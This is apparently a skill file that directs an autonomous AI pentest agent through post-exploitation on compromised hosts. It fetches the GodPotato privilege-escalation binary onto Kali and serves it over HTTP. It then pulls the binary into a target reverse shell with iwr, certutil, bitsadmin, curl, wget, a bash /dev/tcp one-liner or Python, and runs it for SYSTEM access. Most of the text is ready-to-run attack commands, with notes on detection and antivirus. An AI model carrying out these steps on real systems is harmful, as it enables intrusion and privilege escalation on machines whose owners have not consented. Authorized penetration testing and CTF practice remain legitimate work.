---
name: binary-fetch-and-drop
description: Fetch a privesc/lateral binary from the internet into Kali, then pull it into the target reverse shell. The full handoff loop without leaving postex.
allowed-tools: [shell__tmux_new_session, shell__tmux_send, shell__tmux_read]
---

# Fetch from the internet, drop on the target

You have a foothold. You need a binary that isn't on the target — GodPotato,
PrintSpoofer, accesschk, a kernel exploit, a SharpHound build. This skill
covers the full chain without handing back to the orchestrator: Kali fetches
from GitHub → Kali serves the file → the target pulls it through your
existing reverse shell.

## Decide first: do you actually need to do this here?

- **The exact binary is already chosen** (you know the repo + variant) →
  proceed.
- **You're guessing which binary** (does the target run .NET 2 or .NET 4?
  is JuicyPotato or GodPotato right for this Windows build?) → write a
  `summary` describing what you have and hand back to the orchestrator. The
  researcher subagent pins the variant; trying to guess from postex burns
  time you don't have.

Cross-reference: `skills/exploit/prebuilt-exploit-binaries/` has the
binary-by-scenario table and the trust-evaluation rules. Read it for the
"which repo" question. This skill covers the "how do I move it" question.

## The session map

You will have THREE tmux sessions active during this:

| Session | Where it runs | What it's for |
|---|---|---|
| `<target>_shell` (already yours) | Kali pane attached to the target reverse shell | Running commands on the target |
| `kali-fetch` (you create) | Kali bash | Downloading the binary into `/tmp` |
| `kali-serve` (you create) | Kali bash | Running `python3 -m http.server` |

`shell__tmux_new_session` only creates Kali-local sessions. There is no way
to spawn a new session **on the target** — that would require another
listener + a fresh payload, which is the exploit subagent's job. Within
postex you stick to your existing target shell.

## Step 1 — fetch the binary into Kali

```
shell__tmux_new_session(name="kali-fetch", kind="generic")
shell__tmux_send("kali-fetch", "cd /tmp && curl -sSLO https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe")
shell__tmux_send("kali-fetch", "file GodPotato-NET4.exe && wc -c GodPotato-NET4.exe")
shell__tmux_read("kali-fetch", timeout_s=20)
```

`-L` (follow redirects) is non-negotiable on GitHub — without it you save
the redirect HTML instead of the actual binary. `file` should report a PE
or ELF; `wc -c` should show a sensible non-tiny size. If either looks off,
the download failed.

## Step 2 — find the Kali-side address the target can reach

The target reaches Kali at the same `LHOST` your exploit's reverse shell
called back to. You don't need to discover this from scratch — it is in the
episode log under the most recent `start_listener` call. If you have to
re-derive it (only when the log gives you nothing):

```
shell__tmux_send("kali-fetch", "ip route get 1.1.1.1 2>/dev/null | awk '{print $7}'")
```

On a VPN engagement the result is a `tun*` address (often `10.10.16.x` for
HTB). On `ops-net` local-dev, it's the Docker subnet. **Don't guess** —
read the listener invocation.

## Step 3 — serve the binary from Kali

Open a separate session so the server keeps running while you control it:

```
shell__tmux_new_session(name="kali-serve", kind="generic")
shell__tmux_send("kali-serve", "cd /tmp && python3 -m http.server 8000")
shell__tmux_read("kali-serve", timeout_s=3)
```

You should see `Serving HTTP on 0.0.0.0 port 8000`. Leave the session
running.

## Step 4 — pull from inside the target shell

In your existing `<target>_shell` session, NOT in either of the Kali
sessions. Match the method to the target:

### Windows (modern — PS 5+ / Win10 / 2016+)

```
shell__tmux_send("<target>_shell", "iwr http://10.10.16.X:8000/GodPotato-NET4.exe -OutFile C:\\Users\\Public\\g.exe")
```

`iwr` is `Invoke-WebRequest`. `Invoke-RestMethod` (`irm`) works the same way.

### Windows (older / no PowerShell — Win7, Server 2008)

```
shell__tmux_send("<target>_shell", "certutil -urlcache -split -f http://10.10.16.X:8000/GodPotato-NET4.exe C:\\Users\\Public\\g.exe")
```

`certutil` is everywhere on Windows ≥ 2003. Two gotchas: it leaves the
download in the URL cache (no-OPSEC engagements only), and on AV-armed
hosts it's a high-signal LOLBIN. For CTFs it's fine.

### Windows — bitsadmin (works when both above are blocked)

```
shell__tmux_send("<target>_shell", "bitsadmin /transfer dl /priority foreground http://10.10.16.X:8000/g.exe C:\\Users\\Public\\g.exe")
```

### Linux

```
shell__tmux_send("<target>_shell", "curl -sSLo /tmp/loot http://10.10.16.X:8000/payload && chmod +x /tmp/loot")
shell__tmux_send("<target>_shell", "wget -qO /tmp/loot http://10.10.16.X:8000/payload && chmod +x /tmp/loot")
```

Pick one — `curl` if it's there (Kali-style boxes always have it; OpenWRT
might not), else `wget`.

### When neither curl, wget, certutil, nor PowerShell is available

Fall back to a Python or bash oneliner:

```
# Bash (target side)
shell__tmux_send("<target>_shell", "exec 3<>/dev/tcp/10.10.16.X/8000; echo -e 'GET /payload HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n' >&3; cat <&3 > /tmp/loot")

# Python 3
shell__tmux_send("<target>_shell", "python3 -c \"import urllib.request; urllib.request.urlretrieve('http://10.10.16.X:8000/payload', '/tmp/loot')\"")
```

After any of these, **verify**:

```
shell__tmux_send("<target>_shell", "dir C:\\Users\\Public\\g.exe")   # Windows
shell__tmux_send("<target>_shell", "ls -la /tmp/loot && file /tmp/loot")   # Linux
shell__tmux_read("<target>_shell", timeout_s=8)
```

Size should match the source. If the file is 0 bytes or HTML, the download
failed silently — the most common cause is a wrong `LHOST` or a firewall
rule blocking the egress.

## Step 5 — execute on the target

Just run the dropped binary in the target session. For GodPotato that's:

```
shell__tmux_send("<target>_shell", "C:\\Users\\Public\\g.exe -cmd \"cmd /c whoami\"")
shell__tmux_read("<target>_shell", timeout_s=15)
```

Output prefixed with `nt authority\system` confirms the privesc worked. If
you wanted a SYSTEM-tier shell back rather than a one-off whoami, the
binary needs to be told to fire a fresh reverse shell — that's an exploit-
subagent loop, not a postex one. Hand back to the orchestrator with the
binary already staged + verified; exploit will fire the SYSTEM payload.

## Step 6 — stop the HTTP server

Don't leave it listening between targets:

```
shell__tmux_send("kali-serve", "")   # send Ctrl-C: actually use the C-c key
```

`tmux_send` only takes strings as commands — to send a literal Ctrl-C use
`tmux send-keys -t kali-serve C-c` semantics, which the shell MCP wraps as:

```
shell__tmux_send("kali-serve", "\x03")
```

Or just `kill %1` if you backgrounded the server first.

## Common failure modes

| Symptom | Cause | Fix |
|---|---|---|
| Target download is 0 bytes | Wrong `LHOST` — used Kali's loopback or `eth0` instead of `tun0` | Check `ip route` on Kali; use the VPN address |
| `iwr` errors `The remote name could not be resolved` | Target can't reach Kali (no route / firewall) | This is engagement-level; you can't fix it from postex. Hand back. |
| `iwr` errors `Could not establish trust relationship for SSL/TLS` | Tried HTTPS to a non-TLS server | Use plain `http://` — we're serving from `python3 -m http.server` |
| `file` reports `HTML document` for the binary | Forgot `-L` on the GitHub download | Re-fetch with `curl -sSLO` |
| Binary downloaded but ran with `Access denied` | Wrong arch (32 vs 64), wrong .NET version, or AV ate it | Pin the variant with researcher; for CTF, try the other arch first |
| `certutil` runs but file is empty | Older Windows (Server 2008 SP1) URL cache quirk | Try `bitsadmin` or `Invoke-WebRequest` instead |

## When to hand back instead

- The binary is large (≥ 50 MB) and you suspect rate limiting → exploit can
  stage it via SMB or split it.
- You need persistent infrastructure (multiple targets pulling) → exploit
  owns long-running listeners and HTTP servers.
- The exact variant isn't pinned → researcher first.
- Drop succeeded but the binary fires a fresh reverse shell → exploit owns
  the listener for the SYSTEM-tier callback.

## Related

- `skills/exploit/prebuilt-exploit-binaries/` — which binary to fetch for a
  given scenario; trust-evaluation rules; vetted repo list.
- `skills/exploit/file-staging/` — the broader file-into-target patterns
  (SMB, FTP, WebDAV) when HTTP pull from your existing shell isn't viable.
- `skills/postex/hash-cracking/` — same tmux-on-Kali pattern, different
  endpoint (`john` instead of `python3 -m http.server`).
